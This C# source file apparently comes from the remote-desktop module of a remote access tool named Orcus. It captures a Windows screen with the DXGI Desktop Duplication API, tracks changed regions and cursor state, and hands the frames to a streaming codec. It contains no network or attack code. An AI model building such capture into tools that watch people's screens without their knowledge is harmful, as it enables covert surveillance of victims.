using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Orcus.Shared.Utilities.Compression;
using SharpDX;
using SharpDX.Direct3D11;
using SharpDX.DXGI;
using SharpDX.Mathematics.Interop;
using Device = SharpDX.Direct3D11.Device;
using MapFlags = SharpDX.Direct3D11.MapFlags;

namespace Orcus.Commands.RemoteDesktop.Capture.DesktopDuplication
{
    //9% CPU, 60 FPS
    public class DesktopDuplicationService : IScreenCaptureService
    {
        private OutputDuplication _deskDupl;
        private Device _device;
        private OutputDescription _outputDesc;
        private Texture2DDescription _textureDesc;
        private Texture2D _desktopImageTexture;
        private OutputDuplicateFrameInformation _frameInfo;
        private int _currentMonitor;
        private ScreenHelper _screenHelper;

        public Guid Guid { get; set; } = Guid.NewGuid();

        public void Dispose()
        {
            Program.WriteLine("Begin to dispose DesktopDuplicationService");

            _desktopImageTexture?.Dispose();
            _device?.Dispose();
            _deskDupl?.Dispose();

            //important because of null checks
            _deskDupl = null;
            _device = null;
            _desktopImageTexture = null;

            Program.WriteLine("DesktopDuplicationService disposed");
        }

        public bool IsSupported
        {
            get
            {
                if (!IsWindows8OrNewer())
                    return false;

                try
                {
                    var adapter = new Factory1().GetAdapter1(0);
                    new Device(adapter).Dispose();
                    return true;
                }
                catch (SharpDXException)
                {
                    return false;
                }
            }
        }

        bool IsWindows8OrNewer()
        {
            var os = Environment.OSVersion;
            return os.Platform == PlatformID.Win32NT &&
                   (os.Version.Major > 6 || (os.Version.Major == 6 && os.Version.Minor >= 2));
        }

        public void Initialize(int monitor)
        {
            const int graphicsCardAdapter = 0;
            Adapter1 adapter;
            try
            {
                adapter = new Factory1().GetAdapter1(graphicsCardAdapter);
            }
            catch (SharpDXException)
            {
                throw new DesktopDuplicationException("Could not find the specified graphics card adapter.");
            }

            Output output;
            using (adapter)
            {
                _device = new Device(adapter);

                try
                {
                    output = adapter.GetOutput(monitor);
                }
                catch (SharpDXException)
                {
                    throw new DesktopDuplicationException("Could not find the specified output device.");
                }
            }

            using (output)
            using (var output1 = output.QueryInterface<Output1>())
            {
                _outputDesc = output.Description;
                _textureDesc = new Texture2DDescription
                {
                    CpuAccessFlags = CpuAccessFlags.Read,
                    BindFlags = BindFlags.None,
                    Format = Format.B8G8R8A8_UNorm,
                    Width = _outputDesc.DesktopBounds.GetWidth(),
                    Height = _outputDesc.DesktopBounds.GetHeight(),
                    OptionFlags = ResourceOptionFlags.None,
                    MipLevels = 1,
                    ArraySize = 1,
                    SampleDescription = {Count = 1, Quality = 0},
                    Usage = ResourceUsage.Staging
                };

                try
                {
                    _deskDupl = output1.DuplicateOutput(_device);
                }
                catch (SharpDXException ex)
                {
                    if (ex.ResultCode.Code == SharpDX.DXGI.ResultCode.NotCurrentlyAvailable.Result.Code)
                    {
                        throw new DesktopDuplicationException(
                            "There is already the maximum number of applications using the Desktop Duplication API running, please close one of the applications and try again.");
                    }
                }
            }

            _currentMonitor = monitor;
            _screenHelper = new ScreenHelper();
        }

        public void ChangeMonitor(int monitor)
        {
            Dispose();
            Initialize(monitor);
        }

        public Bitmap CaptureScreen()
        {
            if (!RetrieveFrame())
                return null;

            try
            {
                //var cursorMetadata = RetrieveCursorMetadata();
                var bitmap = GetFrameBitmap();
                return bitmap;
            }
            finally
            {
                ReleaseFrame();
            }
        }

        public RemoteDesktopDataInfo CaptureScreen(IStreamCodec streamCodec, ICursorStreamCodec cursorStreamCodec, bool updateCursor)
        {
            //Debug.Print("_desktopDupl == null: " + (_deskDupl == null));
            if (!RetrieveFrame())
                return null;

            // Get the desktop capture texture
            var mapSource = _device.ImmediateContext.MapSubresource(_desktopImageTexture, 0, MapMode.Read,
                MapFlags.None);

            try
            {
                if (updateCursor)
                    _screenHelper.UpdateCursor(cursorStreamCodec, _currentMonitor);
#if FALSE
                if (updateCursor)
                {
                    cursorStreamCodec.UpdateCursorInfo(_frameInfo.PointerPosition.Position.X,
                        _frameInfo.PointerPosition.Position.Y, _frameInfo.PointerPosition.Visible);

                    if (_frameInfo.LastMouseUpdateTime != 0 && _frameInfo.PointerShapeBufferSize > 0)
                    {
                        var buffer = new byte[_frameInfo.PointerShapeBufferSize];

                        unsafe
                        {
                            fixed (byte* ptrShapeBufferPtr = buffer)
                            {
                                int bufferSize;
                                OutputDuplicatePointerShapeInformation shapeInfo;
                                _deskDupl.GetFramePointerShape(_frameInfo.PointerShapeBufferSize,
                                    (IntPtr) ptrShapeBufferPtr, out bufferSize, out shapeInfo);

                                switch (shapeInfo.Type)
                                {
                                    case 0x1: //DXGI_OUTDUPL_POINTER_SHAPE_TYPE_MONOCHROME
                                        var size = Image.GetPixelFormatSize(PixelFormat.Format1bppIndexed);
                                        //var bitmap = new Bitmap(32, 32, 4, PixelFormat.Format1bppIndexed, (IntPtr)ptrShapeBufferPtr);
                                        cursorStreamCodec.UpdateCursorImage((IntPtr) ptrShapeBufferPtr,
                                            shapeInfo.Pitch, 32, 32,
                                            PixelFormat.Format1bppIndexed);
                                        Debug.Print("DXGI_OUTDUPL_POINTER_SHAPE_TYPE_MONOCHROME");
                                        break;
                                    case 0x2: //DXGI_OUTDUPL_POINTER_SHAPE_TYPE_COLOR
                                        cursorStreamCodec.UpdateCursorImage((IntPtr) ptrShapeBufferPtr,
                                            shapeInfo.Pitch, shapeInfo.Width, shapeInfo.Height,
                                            PixelFormat.Format32bppArgb);
                                        Debug.Print("DXGI_OUTDUPL_POINTER_SHAPE_TYPE_COLOR");
                                        break;
                                    case 0x4: //DXGI_OUTDUPL_POINTER_SHAPE_TYPE_MASKED_COLOR
                                        Debug.Print("DXGI_OUTDUPL_POINTER_SHAPE_TYPE_MASKED_COLOR");
                                        break;
                                }
                            }
                        }
                    }
                }
#endif

                if (_frameInfo.TotalMetadataBufferSize > 0)
                {
                    int movedRegionsLength;
                    OutputDuplicateMoveRectangle[] movedRectangles =
                        new OutputDuplicateMoveRectangle[_frameInfo.TotalMetadataBufferSize];
                    _deskDupl.GetFrameMoveRects(movedRectangles.Length, movedRectangles, out movedRegionsLength);
                    var movedRegions =
                        new MovedRegion[movedRegionsLength/Marshal.SizeOf(typeof (OutputDuplicateMoveRectangle))];

                    for (int i = 0; i < movedRegions.Length; i++)
                    {
                        var moveRectangle = movedRectangles[i];
                        movedRegions[i] = new MovedRegion
                        {
                            Source = new Point(moveRectangle.SourcePoint.X, moveRectangle.SourcePoint.Y),
                            Destination =
                                new Rectangle(moveRectangle.DestinationRect.Left,
                                    moveRectangle.DestinationRect.Top,
                                    moveRectangle.DestinationRect.GetWidth(),
                                    moveRectangle.DestinationRect.GetHeight())
                        };
                    }

                    int dirtyRegionsLength;
                    var dirtyRectangles = new RawRectangle[_frameInfo.TotalMetadataBufferSize - movedRegionsLength];
                    _deskDupl.GetFrameDirtyRects(dirtyRectangles.Length, dirtyRectangles, out dirtyRegionsLength);
                    var updatedAreas = new Rectangle[dirtyRegionsLength/Marshal.SizeOf(typeof (Rectangle))];

                    for (int i = 0; i < updatedAreas.Length; i++)
                    {
                        var dirtyRectangle = dirtyRectangles[i];
                        updatedAreas[i] = new Rectangle(dirtyRectangle.Left, dirtyRectangle.Top,
                            dirtyRectangle.GetWidth(), dirtyRectangle.GetHeight());
                    }

                    return streamCodec.CodeImage(mapSource.DataPointer, updatedAreas, movedRegions,
                        new Size(_outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight()),
                        PixelFormat.Format32bppArgb);
                }
                else
                {
                    return streamCodec.CodeImage(mapSource.DataPointer,
                        new Rectangle(0, 0, _outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight()),
                        new Size(_outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight()),
                        PixelFormat.Format32bppArgb);
                }

            }
            finally
            {
                _device.ImmediateContext.UnmapSubresource(_desktopImageTexture, 0);
                ReleaseFrame();
            }
        }

        private bool RetrieveFrame()
        {
            if (_desktopImageTexture == null)
                _desktopImageTexture = new Texture2D(_device, _textureDesc);
            SharpDX.DXGI.Resource desktopResource = null;
            _frameInfo = new OutputDuplicateFrameInformation();

            try
            {
                _deskDupl.AcquireNextFrame(500, out _frameInfo, out desktopResource);
            }
            catch (SharpDXException ex)
            {
                if (ex.ResultCode.Code == SharpDX.DXGI.ResultCode.WaitTimeout.Result.Code)
                {
                    return false;
                }
                if (ex.ResultCode.Failure)
                {
                    throw new DesktopDuplicationException("Failed to acquire next frame.");
                }
            }

            using (var tempTexture = desktopResource.QueryInterface<Texture2D>())
                _device.ImmediateContext.CopyResource(tempTexture, _desktopImageTexture);
            desktopResource.Dispose();
            return true;
        }

        private Bitmap GetFrameBitmap()
        {
            // Get the desktop capture texture
            var mapSource = _device.ImmediateContext.MapSubresource(_desktopImageTexture, 0, MapMode.Read, MapFlags.None);

            var bitmap = new Bitmap(_outputDesc.DesktopBounds.GetWidth(), _outputDesc.DesktopBounds.GetHeight(),
                PixelFormat.Format24bppRgb);

            var boundsRect = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
            // Copy pixels from screen capture Texture to GDI bitmap
            var mapDest = bitmap.LockBits(boundsRect, ImageLockMode.WriteOnly, bitmap.PixelFormat);
            var sourcePtr = mapSource.DataPointer;
            var destPtr = mapDest.Scan0;
            for (int y = 0; y < _outputDesc.DesktopBounds.GetHeight(); y++)
            {
                // Copy a single line 
                SharpDX.Utilities.CopyMemory(destPtr, sourcePtr, _outputDesc.DesktopBounds.GetWidth() * 4);

                // Advance pointers
                sourcePtr = sourcePtr.Add(mapSource.RowPitch);
                destPtr = destPtr.Add(mapDest.Stride);
            }

            // Release source and dest locks
            bitmap.UnlockBits(mapDest);
            _device.ImmediateContext.UnmapSubresource(_desktopImageTexture, 0);
            return bitmap;
        }

        private void ReleaseFrame()
        {
            try
            {
                _deskDupl.ReleaseFrame();
            }
            catch (SharpDXException ex)
            {
                if (ex.ResultCode.Failure)
                {
                    throw ex;
                    //throw new DesktopDuplicationException("Failed to release frame.");
                }
            }
        }
    }
}